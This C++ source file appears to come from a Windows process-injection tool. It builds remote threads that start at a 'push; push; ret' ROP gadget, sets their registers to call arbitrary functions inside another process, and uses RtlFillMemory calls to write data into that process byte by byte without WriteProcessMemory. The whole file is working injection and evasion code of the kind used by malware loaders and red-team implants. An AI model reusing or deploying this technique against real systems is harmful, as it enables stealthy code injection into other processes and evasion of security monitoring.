#include "CreateRemoteThreadUtil h"

bool CreateRemoteThreadViaGadget(HANDLE processHandle, const GadgetInfo &ropGadget,
                                 DWORD64 arg1, DWORD64 arg2, DWORD64 arg3, DWORD64 arg4,
                                 DWORD64 functionAddress, DWORD64 exitThreadAddr)
{

    if (!processHandle || ropGadget.address == nullptr ||
        ropGadget.regId1 == -1 || ropGadget.regId2 == -1 || exitThreadAddr == 0)
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(processHandle, nullptr, 0,
                                        reinterpret_cast<LPTHREAD_START_ROUTINE>(ropGadget.address),
                                        nullptr, CREATE_SUSPENDED, nullptr);
    if (!hThread)
    {
        return false;
    }

    CONTEXT threadContext;
    threadContext.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;

    if (!GetThreadContext(hThread, &threadContext))
    {
        TerminateThread(hThread, EXIT_FAILURE);
        CloseHandle(hThread);
        return false;
    }

    threadContext.Rip = reinterpret_cast<DWORD64>(ropGadget.address);

    // PUSH reg1; PUSH reg2; RET
    // We need RET to jump to functionAddress.
    // We need functionAddress to return to exitThreadAddr.
    // So, reg1 must hold exitThreadAddr, reg2 must hold functionAddress before the PUSHes.
    if (!SetRegisterContextValue(threadContext, ropGadget.regId1, exitThreadAddr))
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        TerminateThread(hThread, EXIT_FAILURE);
        CloseHandle(hThread);
        return false;
    }
    if (!SetRegisterContextValue(threadContext, ropGadget.regId2, functionAddress))
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        TerminateThread(hThread, EXIT_FAILURE);
        CloseHandle(hThread);
        return false;
    }

    threadContext.Rcx = arg1;
    threadContext.Rdx = arg2;
    threadContext.R8 = arg3;
    threadContext.R9 = arg4;

    threadContext.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    if (!SetThreadContext(hThread, &threadContext))
    {
        TerminateThread(hThread, EXIT_FAILURE);
        CloseHandle(hThread);
        return false;
    }

    if (ResumeThread(hThread) == (DWORD)-1)
    {
        TerminateThread(hThread, EXIT_FAILURE);
        CloseHandle(hThread);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return true;
}

bool PerformRemoteMemoryCopy(HANDLE processHandle, const GadgetInfo &ropGadget,
                             LPVOID pRtlFillMemoryFunc, // Expecting RtlFillMemory address here
                             DWORD64 destinationAddress, const unsigned char *sourceData, size_t dataSize,
                             DWORD64 exitThreadAddr)
{

    if (exitThreadAddr == 0)
    {
        SetLastError(ERROR_INVALID_FUNCTION);
        return false;
    }
    if (pRtlFillMemoryFunc == nullptr)
    {
        SetLastError(ERROR_INVALID_PARAMETER);
        return false;
    }

    for (size_t i = 0; i < dataSize; ++i)
    {
        BYTE fillByte = sourceData[i];

        // Use the gadget to call RtlFillMemory(destinationAddress + i, 1, fillByte)
        // Arguments for RtlFillMemory: PVOID Destination, SIZE_T Length, BYTE Fill
        // Mapped to ROP call: RCX, RDX, R8
        bool success = CreateRemoteThreadViaGadget(
            processHandle,
            ropGadget,
            destinationAddress + i,                        // RCX: Destination
            1,                                             // RDX: Length
            static_cast<DWORD64>(fillByte),                // R8:  Fill byte
            0,                                             // R9:  Unused
            reinterpret_cast<DWORD64>(pRtlFillMemoryFunc), // Function to call (RtlFillMemory)
            exitThreadAddr);

        if (!success)
        {
            // If a single byte fill fails, we should probably abort and return false.
            std::cerr << "[!] PerformRemoteMemoryCopy (using RtlFillMemory): Failed to write byte "
                      << i << " (value 0x" << std::hex << static_cast<int>(fillByte) << std::dec << ")"
                      << " to address 0x" << std::hex << (destinationAddress + i) << std::dec
                      << ". Error: " << GetLastError() << std::endl;
            return false;
        }
    }
    return true; // Returns true if all bytes are successfully written.
}
